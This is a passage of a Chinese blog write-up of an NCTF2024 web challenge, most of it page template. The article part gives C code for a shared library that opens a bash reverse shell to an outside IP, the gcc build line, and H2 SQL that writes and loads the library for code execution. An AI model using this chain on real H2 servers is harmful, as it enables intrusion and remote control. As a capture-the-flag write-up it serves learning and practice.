+<p><a target="_blank" rel="noopener" href="https://code-white.com/blog/2019-08-exploit-h2-database-native-libraries-jni/">Exploiting H2 Without javac</a></p>
+<p>首先编写exp.c：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/8.138.127.74/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后gcc编译成so：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC exp.c -o exp.so</span><br></pre></td></tr></table></figure>
+<p>编译完之后问题来到了怎么写入，由于依赖只有h2.，因此上面提到的<code>file write</code>的思路(调用commons-io和cb的静态函数来实现文件读写)不能够直接打通，因此只能够将目光投向h2是否有操作能够直接写入文件，询问<code>deepseek</code>发现可以通过<code>FILE_WRITE</code>函数来写入<code>十六进制</code>文件(并且进行hex decode)：</p>
+<img src="/posts/32411/13.png" class title="awa">
+<p>因此编写1.sql如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span> FILE_WRITE(X<span class="string">&#x27;自己的so的十六进制编码&#x27;</span>, <span class="string">&#x27;/tmp/exp.so&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> ALIAS IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> System_load <span class="keyword">FOR</span> &quot;java.lang.System.load(java.lang.String)&quot;;</span><br><span class="line"><span class="keyword">CALL</span> System_load(<span class="string">&#x27;/tmp/exp.so&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>vps上放好1.sql，将payload发过去监听并等待反弹shell即可：</p>
+<img src="/posts/32411/14.png" class title="awa">
+<p>虽然flag的权限是000，但是flag的所属用户组和用户都是自己(ctf)，因此可以直接通过chmod 777来直接获得flag的读权限</p>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/posts/32411.html",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/posts/32411.html";
+            const title         = "「NCTF2024 Web方向题解」";
+            const excerpt       = `在2025年的比赛为什么要叫2024呢(开玩笑)`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/Web/" rel="tag">Web</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2025-03-24T11:17:38.885Z" itemprop="dateModified">最后编辑：2025-03-24</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" CISCN&amp;长城杯2025半决赛复盘" href="/posts/35955.html">&lt; 上一篇</a>
+            </div>
+            
+            
+        </nav>
+    
+    
+        <div id="v-comments" class="post-comments bg-image"></div>
+<script>
+    var load_comm = () => {
+        const init = () => {
+            new Valine({
+                el: '#v-comments',
+                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
+                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
+                visitor: true,
+                enableQQ: false,
+                path: '/posts/32411.html'
+                
+            });
+        }
+        if (typeof Valine === 'undefined') {
+            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
+            $.getScript(src, init);
+        } else {
+            init();
+        }
+    };
+</script>
+
+
+<script>
+<style>
+    .v .veditor{min-height: 10rem;
+        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: right;
+        background-color: rgba(255,255,255,0);
+        resize: none;}
+</style>
+</script>
+
+
+    <script>
+        new Valine({
+            el: '#vcomments',
+            lang: 'zh-cn',
+            admin_email: '83635877@qq.com',//博主邮箱
+            appId: "",
+            appKey: "",
+            path: window.location.pathname,
+            comment_count: true,
+            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
+            //verify: true, //验证码
+            avatar: 'monsterid',//小怪物头像
+            placeholder: "qwq~"
+        });
+        
+</script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script type="text/javascript">
+        jinrishici.load(function(result) {
+            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
+            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
+        })
+    </script>
+
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>
+
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+        <script src="./js/src/Valine.min.js"></script>   
+        
+        
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/touxiang.png" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                88
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                12
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                15
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">-CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">24</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><span class="category-list-count">16</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Java/" style="font-size: 0.6em;">Java</a> <a href="/tags/Misc/" style="font-size: 0.63em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.69em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.69em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.71em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/awd/" style="font-size: 0.66em;">awd</a> <a href="/tags/java/" style="font-size: 0.74em;">java</a> <a href="/tags/web/" style="font-size: 0.63em;">web</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a> <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" style="font-size: 0.77em;">基础漏洞</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 0.6em;">杂项</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.71em;">渗透</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/posts/32411.html"><i class="fa  fa-book"></i> NCTF2024 Web方向题解</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/35955.html"><i class="fa  fa-book"></i> CISCN&长城杯2025半决赛复盘</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/16382.html"><i class="fa  fa-book"></i> CISCN&长城杯2025半决赛awdp复现——TimeCapsule</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/25622.html"><i class="fa  fa-book"></i> SUCTF2025 Web方向部分思路</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/posts/58260.html"><i class="fa  fa-book"></i> VulnStack 7</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
+                        
+                        
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2025 Err0r233 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                        <div id="binft"></div>
+  <script>
+    var binft = function (r) {
+      function t() {
+        return b[Math.floor(Math.random() * b.length)]
+      }  
+      function e() {
+        return String.fromCharCode(94 * Math.random() + 33)
+      }
+      function n(r) {
+        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+          var l = document.createElement("span");
+          l.textContent = e(), l.style.color = t(), n.appendChild(l)
+        }
+        return n
+      }
+      function i() {
+        var t = o[c.skillI];
+        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
+      }
+      var l = "",
+      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
+      return r + ""
+      }),
+      a = 2,
+      g = 1,
+      s = 5,
+      d = 75,
+      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
+      c = {
+        text: "",
+        prefixP: -s,
+        skillI: 0,
+        skillP: 0,
+        direction: "forward",
+        delay: a,
+        step: g
+      };
+      i()
+      };
+      binft(document.getElementById('binft'));
+  </script>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="7733928587"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+
+    </body>
+</html>
